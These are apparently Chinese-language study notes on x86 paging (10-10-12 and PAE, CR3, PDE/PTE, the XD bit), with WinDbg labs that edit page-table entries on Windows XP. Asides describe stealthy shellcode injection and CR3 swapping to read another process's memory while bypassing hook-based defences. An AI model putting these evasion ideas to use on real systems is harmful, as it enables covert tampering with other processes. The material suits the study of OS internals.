进程的概念就是为了提供CR3。假设一个进程创建了10个线程，这10个线程共用一个表。每个线程都能装一个CR3，但CR3是一样的。 拓展：CPU、操作系统、页CPU说，在保护模式，我通过CR3-&gt;第一级-&gt;第二级的方式来找物理页。操作系统说，既然你要这样找，那我提供每级页的具体内容，你来找。CPU管不着页有没有值，具体是啥值。CPU只管查。拓展：换页是CPU还是操作系统做的换页，操作系统和CPU合伙做的。读、写是操作系统做的，什么时候读，什么时候写，是CPU做的 题外话：注入最好的注入形式，shellcode注入。思考过程：注入的本质就是把自己的dll放到别人的进程空间，让自己的程序在别人的进程空间能执行。那dll的本质是什么？不就是一堆数据。那我直接向目标进程来个远程内存写入，一执行完就抹掉。这样没什么痕迹。监控不让写，那是另一个话题。题外话：远程调用，进程挂靠远程调用：你在A进程启动了一个线程，调用A进程的函数。进程挂靠：把别的进程的CR3改成自己的CR3，你现在的线程依附于他人的进程空间。代码执行时用的数据是人家的。题外话：什么时候能利用到CR3假设这里有进程A和进程B，A进程想读B进程[12345678]地址的数据进程A写代码12mov cr3,Bcr3mov x,[12345678]只要拿到B进程的CR3，此时读的就是进程B的线性地址。跨进程内存读写。但是x也不是自己的x了。有办法的。怎么得到CR3？在EPROCESS结构体中，后面讲。不断切CR3会不会挂？操作系统也在不停地切，挂不挂取决于你有没正确的切换。这种形式是不是防不住？通常防止其他进程读写我进程的内存就是给内核函数挂钩子，但如果这个代码本身是我自己写的，就防不了了。如何防守？我现在什么都不要，只要一个CR3，我也不用操作系统提供的api，就能读你的内存。那怎么不让你得到我的CR3呢？操作系统能读到CR3，我就能读？你能不让操作系统读？无解。别的角度：可以监视所有进程的CR3，看是否有相同的。 10-10-12分页简介 在10-10-12分页模式下，一个线性地址分为3部分（32位系统线性地址是32位的嘛）: （10位、10位、12位，这也是为什么叫10-10-12分页的原因。） CPU按每页4KB（还有大页4M，这里先不管）大小进行管理。 一级目录、二级目录里的每一项是4个字节（32位下地址宽度4字节）。 第1个10位就是看在第一级目录的哪个位置。 第2个10位就是看在第二级目录的哪个位置。 第3个，12，指的是要找的数据在物理页的哪个位置。 所以，当我们拿到一个线性地址，要去找物理地址，将线性地址拆成10-10-12后： CR3+拆分后的第一个10, ×4，找到二级目录地址 二级目录地址+拆分后的第二个10, ×4后，找到物理页首地址 物理页首地址+12位（偏移），得到真正的物理地址 拆分得到的10为索引，32位下地址宽度4字节，所以需要×4。 得到的12为偏移，无需×4 白皮书中线性地址到物理地址的图 实验：通过查找notepad进程中的字符串在物理内存的位置初步感受10-10-12分页 winxp设置分页方式 xp系统默认为2-9-9-12分页，我们修改为10-10-12分页。 打开C:\\boot.int文件（看不到就要打开隐藏文件）： C:\\boot.int123456[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetectmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;debug&quot; /noexecute=optin /fastdetect /debug /debugport=com2 改调试那行，将noexecute改成execute： C:\\boot.int123456[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetectmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;debug&quot; /execute=optin /fastdetect /debug /debugport=com2 ini文件 分页模式 noexecute 2-9-9-12分页 execute 10-10-12分页 重启生效，选调试模式，挂windbg调试器，和之前的一样 Win7~11设置分页方式默认为2-9-9-12分页模式（PAE模式），使用工具EasyBCD快捷修改启动引导属性。 打开notepad进程，将CheatEngine附加在notepad进程上 在CheatEngine中搜索到字符串的线性地址 在记事本中输入字符串，然后用CE第一次搜该字符串，CE选string，Unicode 修改字符串，CE中字符串随着变动的，就是该字符串真正的线性地址，定位到真正的线性地址为000AA958 通过线性地址在windbg中查找字符串的实际物理地址 将线性地址拆成10-10-12的格式 123456789000AA9580000 0000 0000 1010 1010 9580000 0000 00，000 1010 1010，AA958 windbg中使用! process 0 0获取notepad进程的CR3，为1d141000 计算过程：1d141000+0*4 !dd命令查看的是物理内存，dd命令查看的是线性内存 123456789kd&gt; !dd 1d141000+0#1d141000 1cc29067 1d193067 1cf23067 00000000#1d141010 1d1dc067 00000000 00000000 00000000#1d141020 00000000 00000000 00000000 00000000#1d141030 00000000 00000000 00000000 00000000#1d141040 00000000 00000000 00000000 00000000#1d141050 00000000 00000000 00000000 00000000#1d141060 00000000 00000000 00000000 00000000#1d141070 00000000 00000000 00000000 00000000 得到下一个地址1cc29067，后3位是属性，计算时写成0。 计算过程：1cc29000+AA*4 123456789kd&gt; !dd 1cc29000+2A8#1cc292a8 1cce9067 1d14c067 1d31f067 1d1a1067#1cc292b8 1d022067 1cfa3067 1cde4067 1cd25067#1cc292c8 1cee6067 1cde8067 1cea7067 00000000#1cc292d8 00000000 00000000 00000000 00000000#1cc292e8 00000000 00000000 00000000 00000000#1cc292f8 00000000 00000000 00000000 00000000#1cc29308 00000000 00000000 00000000 00000000#1cc29318 00000000 00000000 00000000 00000000 得到下一个地址1cce9067，后3位是属性，计算时写成0。 计算过程：1cce9000+958 !db以字节方式显示这些地址的数据，发现了Hello World123的字样 12345678910kd&gt; !db 1cce9000+958#1cce9958 48 00 65 00 6c 00 6c 00-6f 00 20 00 57 00 6f 00 H.e.l.l.o. .W.o.#1cce9968 72 00 6c 00 64 00 31 00-32 00 33 00 00 00 00 00 r.l.d.1.2.3.....#1cce9978 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#1cce9988 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#1cce9998 00 00 00 00 0c 00 89 00-03 00 0a 00 a0 23 16 00 .............#..#1cce99a8 00 00 0a 00 78 01 0a 00-00 00 00 00 14 00 89 00 ....x...........#1cce99b8 05 00 03 00 a3 01 08 00-00 00 00 00 70 5e 0a 00 ............p^..#1cce99c8 68 b1 99 7c 00 a6 0a 00-00 00 00 00 00 00 00 00 h..|..... 课后练习 创建两个进程，申请一个相同的内存地址比如:0x401234,并存储不同的内容，分别找到这2个进程相对应的物理地址，看内容是什么，说说你的理解。 答案代码中的地址都是线性地址。两个进程，即使用的是同一个线性地址0x401234，因为CR3不同，最后寻到的物理地址是不一样的。代码证明，有两种方式：两个不同的程序，使用同一个线性地址同一个程序运行两次程序A，用Virtualalloc随机申请一个地址，输出这个的地址。123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 分配内存 int* p = (int*)VirtualAlloc(NULL, sizeof(int), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (p == NULL) &#123; printf(&quot;Memory allocation failed &quot;); return 1; &#125; // 存储值 *p = 1; // 打印内存地址 printf(&quot;Using VirtualAlloc to randomly apply for a memory address. &quot;); printf(&quot;Memory address: %p &quot;, p); //暂停住 getchar(); // 释放内存 VirtualFree(p, 0, MEM_RELEASE); return 0;&#125;程序B，用Virtualalloc申请指定内存（程序A输出申请到的地址），运行。1234567891011121314151617181920212223242526272829#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 指定内存地址 LPVOID lpAddress = (LPVOID)0x003A0000; // 分配内存 int* p = (int*)VirtualAlloc(lpAddress, sizeof(int), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (p == NULL) &#123; printf(&quot;Memory allocation failed &quot;); return 1; &#125; // 存储值 *p = 1; // 打印内存地址 printf(&quot;Using VirtualAlloc to allocate a fixed address. &quot;); printf(&quot;Memory address: %p &quot;, p); //暂停住 getchar(); // 释放内存 VirtualFree(p, 0, MEM_RELEASE); return 0;&#125;1234线性地址3a0000拆分0 //10 ;0*4=01110100000,3A0 //10 ;12F*4=E800 //12用windbg分别去查。程序A，CR3：1c4ad000程序B，CR3：1ce90000表格对比程序A（随机申请内存地址）程序B（申请指定内存地址）CR31c4ad0001ce90000寻PDE的windbg指令!dd 1c4ad000+0!dd 1ce90000+0PDE1c3950671cffe067寻PTE的windbg指令!dd 1c395000+E80!dd 1cffe000+E80PTE1c3db0671c9b5067物理页基址1c3db0001c9b5000偏移00寻物理页实际地址的windbg指令!dd 1c3db000+0!dd 1c9b5000+0物理页实际地址上存的值0000000100000001一个程序，编译后，运行exe两次。因为是不同的进程，所以CR3不同。1234567891011#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;x的地址:%x &quot;,&amp;x); getchar();\treturn 0;&#125;1234线性地址12ff7c拆分0 //10 ;0*4=001 0010 1111，12F //10 ;12F*4=4BCF7C //12第1次运行，CR3：20f6a000第2次运行，CR3：22016000表格对比第一次运行的程序第二次运行的程序CR320f6a00022016000寻PDE的windbg指令!dd 20f6a000+0!dd 22016000+0PDE2128106721d95067寻PTE的windbg指令!dd 21281000+4BC!dd 21d95000+4BCPTE20f0506721ed9067物理页基址20f0500021ed9000偏移F7CF7C寻物理页实际地址的windbg指令!dd 20f05000+F7C!dd 21ed9000+F7C物理页实际地址上存的值0000000100000001"},{"title":"2-9-9-12分页","path":"/wiki/Protected_Mode/2-9-9-12分页.html","content":"内容回顾 在10-10-12分页模式下，物理地址最多可达4GB。但随着硬件发展，4GB的物理地址范围已无法满足要求，Intel在1996年就已经意识到这个问题了，所以设计了新的分页方式，也就是2-9-9-12分页,又称为PAE（物理地址扩展）分页，Physical Address Extension。 分页方式设计缘由 10-10-12分页 一开始是确定页的大小。intel工程师认为1个页的大小为4kb是合理的（就像ARM工程师认为1个页的大小为2kb是合理的），4096个字节。 为了找到每一个字节，需要多少个二进制位？4096个索引，至少12位，2的12次方。于是确定了12。 当初的物理内存比较小，intel工程师认为PTE大小为4个字节就够了。因为1个页的大小是4kb，1个成员PTE的大小是4字节，所以1个PTT表有4kb/4字节=1024个PTE。 为了找到每一个PTE，需要多少个二进制位？1024个索引，至少10位，2的10次方。于是确定了10。 与PTE同理。1个页的大小是4kb，1个成员PDE的大小是4字节，所以1个PDT表有4kb/4字节=1024个PDE。 为了找到每一个PDE，需要多少个二进制位？1024个索引，至少10位，2的10次方。于是确定了10。 而且线性地址是32位，确定了12，确定了第二个10，刚好剩下10位。 2-9-9-12分页 1个页的大小仍是4kb，所以12没变。 为了找到每一个字节，需要多少个二进制位？4096个索引，至少12位，2的12次方。于是确定了12。 物理内存寻址范围由什么决定？前面有道题，10-10-12分页模式下能识别的物理内存范围是多少?当时是这样算的：1024项PDE×1024项PTE×4kb = 4GB。原来是：1张PTT表，那我自己加一张PTT表，能不能让识别范围变成8G？这么看：在10-10-12分页模式下，有线性地址0x12345678假设查到的PDE，PTE，物理地址分别如下：PDE：FFAFF123（32位）PTE：FFBFF123（32位）物理地址：FFBFF678（32位），32位，所以物理地址识别范围：2^32=4GBPTE的高20位指示了物理页基址，线性地址低12位指示了物理页内偏移。如果不将物理地址的位数拓宽，那么物理地址识别范围仍然是4GB。跟前面有多少张PDT，PTT表无关。物理地址识别范围由物理地址长度决定，而决定物理地址长度的是PTE表项地址部分的长度（地址+属性）。实际上，决定物理内存寻址范围的唯一因素是页表项PTE。32位的PTE，低12位是属性，高20位是基址，低12位补零后构成了物理页基址。所以，物理地址的寻址范围是由PTE构成的这32位物理页基址决定的，4GB是从这里来的。注意，线程的4GB和物理地址寻址范围的4GB不是同一个东西。物理地址寻址的4GB刚才已解释过，是由PTE决定的。线程的4GB指的是32位线性地址确定的，这个才是和系统位数相关的，和分页模式无关，32位系统的线性地址就是32位。所以，如果想要增加物理地址的访问范围，就要增加PTE的位数。如果PTE是32位，能索引的物理地址是4G；如果PTE是33位，能索引的物理地址是8G；如果PTE是34位，能索引的物理地址是16G；如果PTE是35位，能索引的物理地址是32G。因为在10-10-12分页模式下，PTE大小是4字节，考虑对齐的因素，所以将PTE增加一倍，即8个字节。拓展：32位操作系统能识别超过4GB的内存吗？32位windows server2003和2008是32位xp的服务器版本，它们可以突破4GB。这是因为操作系统内核源码的限制。我们之前在10-10-12分页下计算能识别的最大物理内存是4GB，但xp系统默认就是2-9-9-12分页，2-9-9-12分页能识别64GB内存，但还是不能突破4GB。所以不是分页模式的原因，而是操作系统做的限制。网上有xp突破4GB的补丁，就是hook了操作系统两个对内存4GB的检测。 因为1个页的大小是4kb，1个成员PTE的大小是8字节，所以1个PTT表有4kb/8字节=512项PTE。 为了找到每一项PTE，需要多少个二进制位？512个索引，至少9位，2的9次方。于是确定了9。 与PTE同理。1个页的大小是4kb，1个成员PDE的大小是8字节，所以1个PDT表有4kb/8字节=512个PDE。 为了找到每一个PDE，需要多少个二进制位？512个索引，至少9位，2的9次方。于是确定了9。 为了突破4GB的限制，PTE必须增长，加上考虑对齐，PTE变成了8字节。那PDE仍然用原来的4字节可以吗？因为PTE本身也是一个物理页。4字节的PDE能找的物理地址范围是0-FFFFFFFF，0-4GB，拓宽后的8字节PTE如果在4GB以上的地址，PDE就找不到了。拓宽PDE位数的原因是为了找到PTE。 线性地址一共32位，已用了9-9-12，还剩2位。windows进行了扩展。扩展成了页目录指针表，PDPT（Page-Directory-Point-Table）。里面的成员叫页目录指针表项，PDPTE（Pag e-Directory-Point-Table Entry）。每项成员8字节，成员数量为4（2个二进制位）。从名字就可以看出，这项成员是指针，指向的是页目录表。每个PDPTE都指向了一个PDT表。 剩下的2位不用行吗？每个进程都有4GB的虚拟内存，假设极端情况下，我需要将4GB的线性地址都挂上了物理页。如果没有PDPT表，虚拟内存空间只有512×512×4kb=1GB。线性地址有32位，却只能给1GB的虚拟机内存挂物理页。这样设计就错了。PDPTE，4个指针，1个指针1个PDT，1个指针1个G。如果你想挂满，这样的设计是可以挂满的。如果不用，那么线性地址就只有30位，那么一个进程最多就只能映射1GB的内存了。 在2-9-9-12分页下，理论上8字节全用的话，能识别2^64的物理地址。但操作系统做了限制，（猜测因为硬件不好实现）， 所以能识别的物理地址范围是2^36=64GB。 为了拓宽物理地址范围，所以PTE变成了8字节； 为了找PTE，PDE也变成了8字节； 为了找PDE，PDPTE也变成了8字节。 CR3仍是32位，这说明，PDPTE一定在物理地址4GB以内。 2-9-9-12分页结构图 2：PDPI，在PDPT表中的索引。 9：PDI，在PDT表中的索引。 9：PTI，在PTT表中的索引。 12：在物理页中的偏移。 2-9-9-12分页和10-10-12分页 线性地址32位，所以进程的虚拟空间都是4GB。 2-9-9-12分页和10-10-12分页的区别是：拓宽了能识别的物理内存范围。 能识别的物理内存范围和实际物理内存（插了多少内存条），不同，之间还有一层MMU的转换。 举个例子理解： 假设内存条无限大。 假设在极端情况下，启动一个进程，然后就将它4GB的虚拟空间都挂上物理页，挂满，而且不考虑换页。 在10-10-12分页下，就只能启动一个进程。因为能识别的物理地址范围是4GB。 而在2-9-9-12分页下，可以启动64/4=16个进程。因为在2-9-9-12下能识别的物理地址最大是64GB。 第一个进程的4GB用这个物理页：0-FFFFFFFF 第二个进程的4GB用这个物理页：100000000-1FFFFFFFF 第三个进程的4GB用… … … 第十六个进程的4GB用… 实验：通过线性地址找到物理地址 确保系统开启的分页模式是PAE模式 1234567891011#include &lt;stdio.h&gt;int main()&#123;\tchar x=&#x27;a&#x27;;\tprintf(&quot;x的地址:%x &quot;,&amp;x); getchar();\treturn 0;&#125; 运行，打印变量x的线性地址，然后找到它的物理地址 实验过程运行，getchar时windbg下断12345线性地址12ff7c拆分00 //2 PDPI=0000000000 //9 PDI=0100101111 //9 PTI=12ff7c //12 物理页偏移=f7cPDPI、PDI、PTI都要×8属性还是12位，所以后3位（十六进制）要清0可以看到进程的cr3是0x20这样增长。10-10-12的cr3是0x1000增长!vtop指令验证：1!vtop 0d540320 12ff7c PDPTE结构 PDPTE共有四项(2-9-9-12中的第一个2)。 63-36位Reserverd保留位，保留不是意味着填0。保留的意思是CPU要用，我们不能用，而且CPU用了也不会告诉我们它怎么用。 0位，P位，表示有效无效。 35~12位存储的是页目录表（PDT）基址的高24位，低12位（11-0位）补0，共占36位，即页目录基址。 11-9位，给操作系统用，windows、linux爱怎么用怎么用，反正cpu不用。 PDE结构 PS不同时，PDE的结构不同。第7位是PS位。 PS=1，大页 PS=1时，PDE直接指向大物理页，不再指向PTE。 此时，35-21位是大页的物理地址，20-0这低21位清0。因为低21位清0，所以大页大小是2MB。从另一个角度看：线性地址低21位（32-2-9=21位）是物理页页内偏移，它的大小是2MB。这意味着页的大小是2MB，且都是2MB对齐。 PAT位是Page Attribute Table，页属性表。这个位跟CPU相关，不是所有CPU都支持这个位，如果不支持，填0。这个位是针对页的。所以当PS=0时，PDT指向页目录，PDT就没这个位。 第8位，G位，因为PS=1，所以G位有意义，为0或为1有不同的含义。 PS=0，非大页 当PS=0时，35-12位是页表基址，低12位补0，共36位。 第8位，G位，因为PS=0，G位无意义，为0。 PTE结构 PTE中35-12是物理页基址,24位,低12位补0。 物理页基址+12位的页内偏移指向具体数据 XD/NX位（DEP数据执行保护） 之前提过，段的属性有可读、可写和可执行，但在10-10-12分页中，页的属性只有可读，可写。 如果页没有可执行这个属性，这会出现把数据当作代码来执行的情况。漏洞就是利用了这一点，SQL注入其实也是将用户输入的数据当成代码执行。 漏洞都源于数据可执行，所以Intel从硬件层面上作了保护，做了一个不可执行位。当XD=1时，即使软件溢出了也没关系，即使EIP蹦到了危险的“数据区”，也是不可执行的。 XD标志位（AMD中称为NX，No Execution） 在PAT分页模式下，PDE和PTE结构中最高位都是XD/NX位。 值 含义 1 说明被保护。如果这个是数据，且这个x位被置1，则会报异常不能执行。 0 和正常的10-10-12分页一样。 PDE和PTE中XD位是|的关系，其中一个为1，就是被保护。 所以你也能理解：xp修改分页模式boot.ini文件中，PAE模式的参数为什么是：/noexecute了。 启用PAE模式后，可以找到DEP的配置： “我的电脑”-&quot;属性&quot;或：单击“开始”、“控制面板”、“性能和维护”，然后单击“系统”。 单击“高级”选项卡，之后单击“性能”下的“设置”。 单击“数据执行保护”选项卡。 默认只为windows基本程序和服务开启DEP。 在上面的2-9-9-12实验中可以看到，变量x的PTE最高位是8。表明我们存储的数据’a’，不能当作代码执行。 实验：体会XD位 实验过程参考链接：https://www.cnblogs.com/wingsummer/p/15364649.htmlhttps://blog.csdn.net/Kwansy/article/details/108965196九 课后练习 给0线性地址挂上物理页。 答案其实同《PDE、PTE初步感受.html#实验》部分先观察线性地址0的情况我们先在windbg中观察线性地址0的PDPE、PDE、PDT情况。选了一个进程notepad，查看CR3，查PDPE、PDE、PDT可以看到PTE为0，所有没有物理页。那其实和之前10-10-12的实验一样，我们找一个可用的物理页，然后将该物理页的PTE赋值给0的PTE就好了。将之前的代码贴到这里，未改动123456789101112131415161718#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;x的地址:%x &quot;,&amp;x); //在windbg挂起，得到程序的CR3，根据CR3和变量x的地址得到PTE //把线性地址0的PTE改成变量x的PTE getchar();\tprintf(&quot;向0地址写入123前，0地址数据为:%d &quot;,*(int*)0); //向0地址写入数据\t*(int*)0 = 123; //向0地址读数据\tprintf(&quot;向0地址写入123后，0地址数据为:%d &quot;,*(int*)0);\treturn 0;&#125;修改线性地址0的PTE为变量x的PTE。没有!eq指令，用!ed注意是小端序，别修改反了线性地址0修改后：https://blog.csdn.net/Kwansy/article/details/108965196五 修改页属性,实现应用层读写高2G内存地址。 答案https://blog.csdn.net/Kwansy/article/details/108965196六、 逆向分析MmlsAddressValid函数，找到PAE分页模式下页目录表、页表基址。 答案https://blog.csdn.net/Kwansy/article/details/108965196七、 编写代码实现第二题。 答案https://blog.csdn.net/Kwansy/article/details/108965196八、 页目录表基地和页表基址"},{"title":"PDE、PTE初步感受","path":"/wiki/Protected_Mode/PDE、PTE初步感受.html","content":"概念 第一级：页目录表（PDT，Page-Directory Table） 页目录表项（PDE，Page Directory Entry），页目录表中的成员 第二级：页表（PTT，Page Table） 页表项（PTE，Page Table Entry），页表中的成员 CR3里存储的物理地址指向页目录表（PDT），里面的成员页目录表项（PDE）指向页表（PTT），里面的成员页表项（PTE）指向物理页。 PDE和PTE后三位（十六进制）是属性 页表项（PTE）特征 PTE可以不指向物理页 还没分配到 1个PTE只能指向1个物理页 多个PTE可以指向同一个物理页（不同权限） 10-10-12分页位数划分分析 在Windows中，一个页的大小通常为4KB(也有4MB的页，称为大页，这里先不管)。 物理页大小4KB，即2^12次方，要用12位表示。 页目录表（PDT）大小4KB，4096字节，每一项是4字节（32位下地址宽度4字节），所以有1024项，即2^10次方，需要10位来作为页目录表（PDT）的序号，表明找哪一项。 页表（PTT）大小4KB，每一项是4字节（32位下地址宽度4字节），所以有1024项，即2^10次方，需要10位来作为页表（PTT）的序号，表明找哪一项。 所以是10-10-12。 实验 1. 拆分线性地址0，观察PTE是否有物理页 线性地址0+windbg用! process 0 0随便找1个进程的CR3，去找物理页 线性地址0按10-10-12拆，都是0，和没加一样，所以下面把PDE和PTE后3位属性位写成0，然后查就行。 可以看到，线性地址0拆出来的PTE为0，即没有指向物理页。（证明了上面说的PTE可以不指向任何物理页） 所以0地址无法读数据，也没办法写数据，因为没分配物理页。那我们实在想写呢？给它挂一个物理页呗，来，第二题。 2. 向0地址读写数据 代码分析：变量x一运行就会自动分配到物理地址，将线性地址0的PTE改成变量x的PTE，即地址0挂上了物理页，就能读写0地址了。 12345678910111213141516171819#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;x的地址:%x &quot;,&amp;x); //在windbg挂起，得到程序的CR3，根据CR3和变量x的地址得到PTE //把线性地址0的PTE改成变量x的PTE getchar(); //修改PTE后0地址处的值是多少，后文讲拓展会提到这句\tprintf(&quot;向0地址写入123前，0地址数据为:%d &quot;,*(int*)0); //向0地址写入数据\t*(int*)0 = 123; //向0地址读数据\tprintf(&quot;向0地址写入123后，0地址数据为:%d &quot;,*(int*)0);\treturn 0;&#125; 编译运行，一运行变量x会自动分配到线性地址。 1234线性地址12ff7C拆分0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12 windbg下断，! process 0 0查看到该进程的CR3是19e8a000 因为在同一个进程中，所以变量x和地址0的CR3一样 1234线性地址0拆分0 //10 ;0*4=00 //10 ;0*4=00 //12 把线性地址0的PTE改成变量x的PTE 输入g，返回虚拟机，查看结果输出： 修改PTE后，成功读、写0地址数据 讲些细节，上边可能没注意到 参考： （18）修改 PTE 实现挂物理页读写空指针-hambaga的csdn博客 PDE和PTE 变量x的线性地址是：12ff7c，按10-10-12拆完后是 1234线性地址12ff7C拆分0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12 线性地址0拆完后是 1234线性地址0拆分0 //10 ;0*4=00 //10 ;0*4=00 //12 第一个10都是0，加上CR3一样，所以PDE一样。 然后通过PDE去页表（PTT）找PTE时，变量x是加4BC，地址0是加0，所以两者指向装着PTE的页表（PTT）地址不一样。 变量x 地址0 19dc1000+4BC=19ec5067 19dc1000+0=19dc1000 将地址0的PTE改成变量x的PTE后，地址0和变量x的PTE都指向了同一个物理页，但是偏移不同（拆完的12位不一样，变量x的是F7C，地址0的是0）。 并不是地址0就用了变量x的实际物理地址，通过代码中 12 //修改PTE后0地址处的值是多少，后文讲拓展会提到这句printf(&quot;向0地址写入123前，0地址数据为:%d &quot;,*(int*)0); 这行输出是可以看出来的，修改地址0的PTE后，输出的值是70（随机值），而不是变量x的值1。 变量x 地址0 修改PTE后的地址0 备注 线性地址 12ff7c 0 0 CR3 19e8a000 19e8a000 19e8a000 因为在同一个进程 拆分后第1个10 0 0 0 CR3+第1个10，指向的PDE 19dc1067 19dc1067 19dc1067 因为拆分后的10一样，所以PDE一样 拆分后第2个10（已*4） 4BC 0 0 PDE+第2个10，指向的PTE 19ec5067 0 19ec5067 将地址0的PTE改为和变量x的PTE一样 拆分后的12 F7C 0 0 指向的物理页基址 19ec5000 无 19ec5000 实际物理地址 19ec5000+F7C 无 19ec5000+0 现在，地址0的PTE已经指向了一个物理页，可以进行读写了。 拓展和总结 有效的PTE=有效的物理地址+P=1 没有所谓不能访问的地址，无论3环还是0环，只要给个有效的PTE就能访问 推导过程： 有效的物理地址0的PTE是0，只改属性位能实现可读可写吗？即使把线性地址0的PTE，改了属性P=1，R/W=1，有效，可读可写。也不行原因：线性地址0的PTE由物理地址+12位的属性组成。假设线性地址0的PTE：0+12属性（线性地址0 对应-&gt;物理地址0）0 PTE:0 + 12属性（线性地址0-&gt;物理地址0）0 PTE:1234 + 12属性（线性地址1234-&gt;物理地址1234）这个地址不是你随便想用就用的，要看操作系统是否分配了的。回到之前说的，CPU和操作系统，页的关系，CPU定义了从CR3-&gt;一级页-&gt;二级页的查找规则，但是页表的内容由操作系统定义的。你不知道操作系统分了哪些地址是分了哪些没分，所以自己定义一个变量（这个变量会自动分配到物理页），然后将x的物理页给0挂上。注意要给变量x赋值，x只有定义可能没分配到物理页1int x =1;1int x;P位=1假设我定义了一个变量x1int x=12345678;通过10-10-12拆分x的线性地址可以得到x的PDE和PTE，记为PTEA通过10-10-12拆分线性地址0可以得到0的PDE和PTE，记为PTEB然后将0的PTE修改为x的PTE，并且把0的PTE的P位修改为0。现在，x的PTEA，0的PTEB，除了P位，其他一样，因为地址部分20位一致，所以它们指向同一个物理页。看0的PTEB，它的地址部分20位，指向了有效的物理页，但是在程序中还是不能读写线性地址0，因为P位是0。 为什么保护模式这么设计？ 实现对内存的保护，可以通过P位、R/W、U/S位来保护，想怎么保护就怎么保护 课后练习 线性地址0为什么不能访问?将0地址设置为可读可写。 答案同实验部分 为变量x再映射一个线性地址,并通过这个新的地址读取x的值。 答案分析代码运行参考：（18）修改 PTE 实现挂物理页读写空指针-hambaga-csdn博客回顾一下寻址过程：线性地址：10:10:12CR3+第1个10位*4-&gt;PDEPDE(后三位清0)+第2个10位*4-&gt;PTEPTE(后三位清0)+12位（偏移）-&gt;物理页声明一个int类型变量x，赋值为1。用VirualAlloc申请一块物理页，得到指针p。同一个程序，CR3一样。因为指针p要指向变量x，所以物理页页偏移要一样，12位一样。第1个10位决定PDE，第2个10位决定PTE。将指针p的PTE修改和变量x的一样就好了。总结：改指针p的PTE和12位。物理页页偏移在代码中改，指针p的PTE在windbg中改。如果将指针p的第1个10位也改了，其实整个线性地址和变量x是一样的了。代码表示就是12int x = 1;int *p = &amp;x;//p指向x的地址12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; int x = 1; // 申请一个新的物理页，将p的PTE和物理页内偏移改成和x一样 int p = (int)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE); int p_bak = p; // 备份新分配的内存区域的起始地址，以便后续释放内存 memset((int *)p, 0, 0x1000); // 将新分配的内存区域清零 printf(&quot;x的地址：%x &quot;, &amp;x); //修改指针p的PTE和物理页偏移 printf(&quot;修改前，指针p的线性地址：%x &quot;, p); p &amp;= 0xFFFFF000; p |= ((int)&amp;x &amp; 0x00000FFF); //将指针p的后12位修改为变量x的 printf(&quot;修改后，指针p的线性地址：%x &quot;, p); getchar(); // 在windbg里修改 p 的 PTE // 用新的线性地址读x printf(&quot;通过线性地址p来读取x的值，*addr：%x &quot;, *(int *)p); // 0x1 // 用新的线性地址写x *(int *)p = 0x112233; printf(&quot;通过线性地址p修改x后，x：%x &quot;, x); // 0x112233 getchar(); VirtualFree((int *)p_bak, 0x1000, MEM_DECOMMIT); return 0;&#125;运行windbg下断，查变量x的PTE查到该进程的CR3是20a520001234线性地址12ff7C拆分0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12查x的PTE：123!dd 20a52000+0!dd 2061d000+4BC!dd 20321000+F7CPTE是20321067修改指针p的PTE为变量x的1234线性地址3a0f7c拆分0 //10 ;0*4=011 1010 0000，3A0 //10 ;3A0*4=E80F7C //12改指针p的命令123!dd 2061d000+E80!ed 2061de80 20321067!dd 2061d000+E80返回虚拟机继续执行回车，getchar按下后，windbg就报错了。我也不知道什么原因123456789101112131415kd&gt; g*** Fatal System Error: 0x0000004e (0x00000099,0x00000000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Thu Aug 17 15:03:09.317 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols........................................... 10-10-12分页模式物理内存能够识别的最多范围是多少? 答案1个PDE指向了1个页表。有多少个PDE就有多少个页表。页目录表有1024项，页表有1024项，物理页有4KB寻址范围: 1024×1024×4096 = 4GB物理页大小为4KB（在10-10-12中还有一种页,4MB,称为大页)一张页表能包含的物理页:1024×4KB = 4MB10-10-12分页中共有1024张页表:1024×4MB= 4GB 如何判断2个线性地址是否在同一个物理页? 答案通过练习1、2题可以感受到前提：CR3一样。看线性地址前20位，只要相同就在同一个物理页。因为前20位确定了PDE和PTE，PTE相同一定是同一个物理页。推导：PTE相同，物理页相同。PTE相同，PDE一定一样。所以PDE、PTE一样。 推导：一整个物理页的属性是一致的有如下C代码12int *p = 0;*p = 12345678;等价汇编指令是1mov dword ptr 